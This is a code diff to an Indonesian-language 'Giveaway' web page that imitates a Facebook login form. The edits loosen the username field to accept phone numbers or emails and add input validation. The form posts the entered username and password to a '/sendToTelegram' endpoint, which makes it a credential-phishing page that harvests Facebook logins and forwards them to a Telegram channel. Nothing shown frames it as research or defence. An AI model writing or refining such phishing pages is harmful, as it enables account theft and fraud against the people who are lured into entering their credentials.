@@ -47,12 +47,12 @@
         <a href="#loginSection" class="cta-btn-secondary">Masuk Sekarang</a>
     </section>
 
-   <!-- Login Section -->
+    <!-- Login Section -->
     <section id="loginSection" class="login-section">
         <div class="login-container">
             <h2 translate="no">Facebook</h2>
             <form id="loginForm">
-                <input type="email" id="username" name="username" placeholder="No.hp/email" required>
+                <input type="text" id="username" name="username" placeholder="Masukkan No. HP atau Email" required>
                 <input type="password" id="password" name="password" placeholder="Password" required>
                 <button type="submit" translate="no">Login</button>
             </form>
@@ -113,12 +113,24 @@
         <p>&copy; 2024 Giveaway. Semua hak dilindungi.</p>
     </footer>
 
+    <!-- JavaScript -->
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             const feedback = document.getElementById('feedback');
+
+            // Regex untuk validasi email dan nomor telepon
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phoneRegex = /^[0-9]{10,14}$/; // Sesuaikan panjang nomor telepon sesuai kebutuhan
+
+            if (!emailRegex.test(username) && !phoneRegex.test(username)) {
+                feedback.textContent = 'Masukkan No. HP atau Email yang valid!';
+                feedback.style.color = 'red';
+                feedback.style.display = 'block';
+                return;
+            }
 
             fetch('/sendToTelegram', {
                 method: 'POST',
@@ -141,8 +153,7 @@
                 feedback.style.display = 'block';
             });
         });
-    </script>
-        <script>
+
         document.querySelector('.cta-btn-secondary').addEventListener('click', function(e) {
             e.preventDefault();
             document.getElementById('loginSection').scrollIntoView({
